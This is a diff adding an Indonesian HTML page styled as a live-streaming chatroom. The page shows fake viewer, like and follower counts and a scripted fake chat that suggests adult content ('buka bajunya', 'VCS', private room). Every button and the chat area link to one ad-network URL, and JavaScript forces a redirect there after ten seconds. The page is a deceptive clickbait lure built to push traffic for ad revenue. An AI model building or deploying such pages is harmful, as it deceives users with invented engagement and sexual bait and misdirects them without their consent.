@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Streaming Chatroom</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Container Utama Handphone */
+        .live-container {
+            position: relative;
+            width: 100%;
+            max-width: 450px;
+            height: 100vh;
+            background: #222;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+
+        /* Video Background */
+        .video-bg {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Overlay Atas (Live & Penonton) */
+        .top-overlay {
+            position: absolute;
+            top: 20px;
+            left: 0;
+            right: 0;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 15px;
+            z-index: 10;
+        }
+
+        .live-badge {
+            background-color: #ff0050;
+            color: white;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .live-badge::before {
+            content: '';
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background-color: white;
+            border-radius: 50%;
+        }
+
+        .stats-container {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .stat-box {
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            backdrop-filter: blur(5px);
+        }
+
+        /* Overlay Kanan (Menu Interaksi) */
+        .right-menu {
+            position: absolute;
+            right: 15px;
+            bottom: 180px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            z-index: 10;
+        }
+
+        .menu-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: white;
+            font-size: 12px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .icon-circle {
+            width: 50px;
+            height: 50px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 22px;
+            margin-bottom: 4px;
+            backdrop-filter: blur(5px);
+            transition: transform 0.2s;
+        }
+
+        .icon-circle.heart { color: #ff3b30; }
+
+        /* FITUR BARU: FAKE CHATBOX OVERLAY (Kiri Bawah di atas profil) */
+        .chat-container-overlay {
+            position: absolute;
+            bottom: 150px;
+            left: 15px;
+            width: 70%;
+            height: 130px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            gap: 6px;
+            z-index: 10;
+            text-decoration: none;
+        }
+
+        .chat-msg {
+            background: rgba(0, 0, 0, 0.4);
+            color: #fff;
+            padding: 5px 12px;
+            border-radius: 14px;
+            font-size: 12px;
+            line-height: 1.4;
+            animation: fadeInUp 0.3s ease forwards;
+            max-width: 100%;
+            word-wrap: break-word;
+            backdrop-filter: blur(3px);
+            border-left: 3px solid #ff0050; /* Aksen estetik pelengkap live */
+        }
+
+        .chat-user {
+            color: #ff9500;
+            font-weight: bold;
+            margin-right: 5px;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Overlay Bagian Profil Bawah */
+        .bottom-overlay {
+            position: absolute;
+            bottom: 25px;
+            left: 15px;
+            right: 15px;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .status-pill {
+            align-self: flex-start;
+            background: rgba(0, 0, 0, 0.6);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            backdrop-filter: blur(5px);
+        }
+
+        .profile-card {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 12px;
+            border-radius: 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+
+        .profile-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+
+        .bell-icon {
+            width: 40px;
+            height: 40px;
+            background: #ff5e7e;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 18px;
+        }
+
+        .user-detail {
+            color: white;
+        }
+
+        .username {
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .followers {
+            font-size: 12px;
+            color: #ccc;
+        }
+
+        .btn-follow {
+            background: #ff0050;
+            color: white;
+            text-decoration: none;
+            padding: 10px 24px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="live-container">
+        
+        <!-- VIDEO BACKGROUND (Bisa diganti file/link video Anda) -->
+        <video class="video-bg" autoplay loop muted playsinline>
+            <source src="desi.mp4" type="video/mp4">
+        </video>
+
+        <!-- OVERLAY ATAS -->
+        <div class="top-overlay">
+            <div class="live-badge">LIVE</div>
+            <div class="stats-container">
+                <div class="stat-box">👁️ 13.4K</div>
+                <div class="stat-box">❤️ 74.6K</div>
+            </div>
+        </div>
+
+        <!-- FAKE CHATBOX OVERLAY (Klik area chat langsung direct link) -->
+        <a href="https://www.effectivecpmnetwork.com/gv1m6uxcp4?key=2d36c866df46e0c95b165bc13538c37b" class="chat-container-overlay" id="live-chat-box">
+            <!-- Pesan chat otomatis diproduksi oleh JavaScript di bawah -->
+        </a>
+
+        <!-- OVERLAY MENU INTERAKSI (KANAN) -->
+        <div class="right-menu">
+            <!-- 1. TOMBOL SUKA -->
+            <a href="https://www.effectivecpmnetwork.com/gv1m6uxcp4?key=2d36c866df46e0c95b165bc13538c37b" class="menu-item">
+                <div class="icon-circle heart">❤️</div>
+                <span>Suka</span>
+            </a>
+            
+            <!-- 2. TOMBOL KOMEN -->
+            <a href="https://www.effectivecpmnetwork.com/gv1m6uxcp4?key=2d36c866df46e0c95b165bc13538c37b" class="menu-item">
+                <div class="icon-circle">💬</div>
+                <span>Komen</span>
+            </a>
+            
+            <!-- 3. TOMBOL VIP -->
+            <a href="https://www.effectivecpmnetwork.com/gv1m6uxcp4?key=2d36c866df46e0c95b165bc13538c37b" class="menu-item">
+                <div class="icon-circle" style="color: #007aff;">💎</div>
+                <span>VIP</span>
+            </a>
+        </div>
+
+        <!-- OVERLAY BAWAH (PROFIL) -->
+        <div class="bottom-overlay">
+            <div class="status-pill">🔥 Live sekarang...</div>
+            
+            <div class="profile-card">
+                <!-- 4. TOMBOL STREAMER (KLIK PROFIL/NAMA) -->
+                <a href="https://www.effectivecpmnetwork.com/gv1m6uxcp4?key=2d36c866df46e0c95b165bc13538c37b" class="profile-info">
+                    <div class="bell-icon">🔔</div>
+                    <div class="user-detail">
+                        <div class="username">@streamer_01</div>
+                        <div class="followers">578K Pengikut</div>
+                    </div>
+                </a>
+                
+                <!-- 5. TOMBOL IKUTI -->
+                <a href="https://www.effectivecpmnetwork.com/gv1m6uxcp4?key=2d36c866df46e0c95b165bc13538c37b" class="btn-follow">Ikuti</a>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- JAVASCRIPT LOGIC -->
+    <script>
+        // 1. PENGALIHAN OTOMATIS (10 DETIK)
+        const targetLinkOtomatis = "https://www.effectivecpmnetwork.com/gv1m6uxcp4?key=2d36c866df46e0c95b165bc13538c37b"; 
+        setTimeout(function() {
+            window.location.href = targetLinkOtomatis;
+        }, 10000);
+
+        // 2. SIMULASI ALIRAN LIVE CHAT PALSU
+        const chatData = [
+            { user: "Andi_Jkt", msg: "Wow gila parah mantap kakk 😍" },
+            { user: "Raraaa", msg: "kak buka bajunya dongh" },
+            { user: "Gamer_Sejati", msg: "Room privatnya klik mana kak?" },
+            { user: "Melon_32", msg: "Absen hadir dr bandung kk hot" },
+            { user: "Putra_Utama", msg: "Buka link yg mana sis? 🥵" },
+            { user: "Sayang_Kamu", msg: "Join grup VCS dong kak pliss" },
+            { user: "Vina_Lova", msg: "Ikutan gabung room dong kk" }
+        ];
+
+        const chatBox = document.getElementById("live-chat-box");
+        let chatIndex = 0;
+
+        function startFakeChat() {
+            if (chatIndex < chatData.length) {
+                const newChat = document.createElement("div");
+                newChat.className = "chat-msg";
+                newChat.innerHTML = `<span class="chat-user">${chatData[chatIndex].user}:</span>${chatData[chatIndex].msg}`;
+                
+                chatBox.appendChild(newChat);
+
+                // Batasi maksimal 3 baris chat saja biar tetap clean
+                if (chatBox.children.length > 3) {
+                    chatBox.removeChild(chatBox.children[0]);
+                }
+
+                chatIndex++;
+                // Durasi kemunculan chat acak (antara 1.5 hingga 3 detik)
+                setTimeout(startFakeChat, Math.random() * 1500 + 1500);
+            } else {
+                chatIndex = 0; // Ulangi lagi dari chat pertama jika list habis
+                setTimeout(startFakeChat, 1000);
+            }
+        }
+
+        // Jalankan animasi chat setelah 1 detik halaman terbuka
+        setTimeout(startFakeChat, 1000);
+    </script>
+
+</body>
+</html>
